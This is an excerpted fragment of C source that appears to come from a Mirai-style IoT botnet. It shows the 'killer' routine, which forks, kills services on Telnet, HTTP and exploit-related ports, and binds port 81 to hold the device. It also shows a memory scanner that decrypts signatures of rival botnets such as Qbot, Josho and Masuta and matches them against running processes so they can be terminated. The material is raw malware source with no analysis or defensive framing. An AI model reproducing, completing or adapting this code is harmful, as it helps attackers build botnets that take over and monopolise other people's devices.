...
void killer_init(void)
{
    ...
    int rt_bind_fd;
    struct sockaddr_in gh_bind_addr;
    int hw_bind_fd;
    killer_pid = fork();
    ...
    gh_bind_addr.sin_port = htons(81);
    ...
    if (killer_kill_by_port(htons(23)) || killer_kill_by_port(htons(53413)) || killer_kill_by_port(htons(80)) || killer_kill_by_port(htons(52869)) || killer_kill_by_port(htons(81)))
    {
    ...
    {
        bind(hw_bind_fd, (struct sockaddr *)&gh_bind_addr, sizeof (struct sockaddr_in));
        listen(hw_bind_fd, 1);
    }
...
static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_route, *m_mirai3, *m_bogo, *m_masuta1, *m_masuta2, *m_mirai1, *m_mirai2, *m_vamp1, *m_vamp2, *m_vamp3, *m_josho, *m_cpuinfo, *m_rc, *m_miraimaps, *m_qbot1, *m_qbot2, *m_irc, *m_irc1, *m_exe;
    int m_mirai3_len, m_bogo_len, m_miraimaps_len, m_exe_len, m_route_len, m_masuta1_len, m_masuta2_len, m_mirai1_len, m_mirai2_len, m_vamp1_len, m_vamp2_len, m_vamp3_len, m_josho_len, m_rc_len, m_cpuinfo_len, m_qbot1_len, m_qbot2_len, m_irc_len, m_irc1_len;
    BOOL found = FALSE;
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;
    table_unlock_val(TABLE_MEM_ROUTE);
    table_unlock_val(TABLE_MEM_EXE);
    table_unlock_val(TABLE_MEM_JOSHO);
    table_unlock_val(TABLE_MEM_BOGO);
    table_unlock_val(TABLE_MEM_IRC1);
    table_unlock_val(TABLE_MEM_IRC2);
    ...
    m_josho = table_retrieve_val(TABLE_MEM_JOSHO, &m_josho_len);
    m_rc = table_retrieve_val(TABLE_MEM_RC, &m_rc_len);
    m_exe = table_retrieve_val(TABLE_MEM_EXE, &m_exe_len);
    m_irc = table_retrieve_val(TABLE_MEM_IRC1, &m_irc_len);
    m_irc1 = table_retrieve_val(TABLE_MEM_IRC2, &m_irc1_len);
    m_qbot1 = table_retrieve_val(TABLE_MEM_QBOT1, &m_qbot1_len);
    m_qbot2 = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len);
    m_cpuinfo = table_retrieve_val(TABLE_MEM_CPUINFO, &m_cpuinfo_len);
    m_miraimaps = table_retrieve_val(TABLE_MAPS_MIRAI, &m_miraimaps_len);
    m_bogo = table_retrieve_val(TABLE_MEM_BOGO, &m_bogo_len);
    m_mirai3 = table_retrieve_val(TABLE_MEM_MIRAI3, &m_mirai3_len);
    ...
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_route, m_route_len) ||
		    ...
		    mem_exists(rdbuf, ret, m_irc, m_irc_len) ||
            mem_exists(rdbuf, ret, m_miraimaps, m_miraimaps_len) ||
		    mem_exists(rdbuf, ret, m_rc, m_rc_len) ||
  		    mem_exists(rdbuf, ret, m_exe, m_exe_len) ||
    ...
    table_lock_val(TABLE_MEM_EXE);
    table_lock_val(TABLE_MEM_JOSHO);
    table_lock_val(TABLE_MEM_BOGO);
    table_lock_val(TABLE_MEM_IRC1);
    table_lock_val(TABLE_MEM_IRC2);
